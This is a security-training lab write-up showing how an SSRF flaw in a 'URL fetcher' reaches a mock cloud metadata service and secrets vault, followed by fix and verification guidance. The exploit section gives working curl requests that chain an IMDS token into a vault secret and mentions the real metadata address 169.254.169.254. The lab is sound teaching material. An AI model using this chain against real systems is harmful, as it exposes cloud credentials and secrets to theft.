# Lab 02: SSRF to IMDS and the secrets vault

The "URL fetcher" in `/tools` fetches any URL from the server. The compose network runs two internal services: a fake cloud metadata service (`imds:8090`) and a secrets vault (`vault:8091`). From the app container both are one request away — exactly like a real cloud VM where the metadata endpoint hands out cloud credentials.

**OWASP Top 10:2025:** A01 (SSRF) / [A02 Security Misconfiguration](https://owasp.org/Top10/2025/)

**Code:** `routes/tools.js` (`/tools/fetch`, `/tools/vault-check`), `mocks/imds/`, `mocks/vault/`

## Exploit

1. Log in as any user, open **Tools**, and fetch the metadata listing:

```text
URL: http://imds:8090/latest/meta-data/
```

You get `compute/instance-id`, `compute/region`, `iam/security-credentials/` — the fetcher rendered the internal network's answer for you.

2. Grab the IMDS token through the same fetcher:

```bash
curl -s -c cookies.txt -X POST http://localhost:8888/login/auth \
  -d "username=alice" -d "password=alice123"

curl -s -b cookies.txt -X POST http://localhost:8888/tools/fetch \
  --data-urlencode "url=http://imds:8090/latest/api/token"
# IMDS-TOKEN-3f9a2c
```

3. Exchange it at the vault for the pipeline secret:

```bash
curl -s -b cookies.txt -X POST http://localhost:8888/tools/fetch \
  --data-urlencode "url=http://vault:8091/secrets/pipeline" \
  --data-urlencode "token=IMDS-TOKEN-3f9a2c"
# PIPELINE_SECRET=VN-d03nt3st-th1s-1s-f4k3-42
```

One-liner chain: the app's own **Run vault check** link does the full IMDS → vault dance server-side: `/tools/vault-check`.

4. If this app ran on a real VM, `http://169.254.169.254/...` would return actual cloud credentials — same bug, real keys, real bill.

## Why it happens

The URL is user input handed to `fetch()`. The server is on a trusted network; the user is not.

## Fix

- Allowlist schemes and hosts (`https://api.example.com` only).
- Resolve DNS **after** validation and pin the resolved IP; refuse link-local ranges (`169.254.0.0/16`), loopback, and RFC1918 unless explicitly intended.
- Never let the client choose or influence which internal credentials to attach.
- Egress proxy for any outbound call.

## Verify

After the fix, `http://imds:8090/...` is rejected before any request leaves the app.

## Hardening note

The mocks are only reachable inside the compose network (no published ports) — same trust boundary as a real IMDS.